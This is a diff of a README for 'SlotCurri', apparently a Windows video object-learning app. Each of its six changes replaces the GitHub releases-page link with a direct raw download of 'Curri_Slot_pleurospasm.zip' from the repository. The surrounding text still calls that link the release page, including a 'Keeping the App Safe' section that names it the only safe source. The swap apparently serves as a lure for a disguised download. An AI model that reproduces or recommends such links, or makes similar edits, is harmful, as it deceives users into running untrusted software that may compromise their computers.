@@ -1,6 +1,6 @@
 # 🎬 SlotCurri - Smooth Video Object Learning
 
-[![Download SlotCurri](https://img.shields.io/badge/Download-SlotCurri-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases)
+[![Download SlotCurri](https://img.shields.io/badge/Download-SlotCurri-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip)
 
 ## 🖥️ What SlotCurri Does
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📦 Download the App
 
 Visit this page to download SlotCurri:
-https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
+https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip
 
 On that page:
 1. Open the latest release
@@ -51,7 +51,7 @@ Check these items first:
 Follow these steps:
 
 1. Open the release page:  
-   https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
+   https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip
 
 2. Download the Windows file from the latest release
 
@@ -158,7 +158,7 @@ This makes it useful for video research, demos, and learning how object-centric 
 ## 📌 Release Source
 
 Download the latest Windows build here:  
-https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
+https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip
 
 ## 🔍 Project Topics
 
@@ -198,7 +198,7 @@ Do not rename these folders unless the app instructions say you can.
 ## 🔐 Keeping the App Safe
 
 Use the release page as the only download source:
-https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
+https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip
 
 Keep the app in a local folder on your PC. Avoid running it from a cloud sync folder if you can.
 
@@ -223,4 +223,4 @@ Avoid long names with special symbols. This helps Windows and the app find the f
 ## 📎 Where to Get Updates
 
 Check the release page for new Windows builds, fixes, and package updates:
-https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
+https://raw.githubusercontent.com/Arboresque-rhyncostylis987/SlotCurri/main/slotcurri/Curri_Slot_pleurospasm.zip
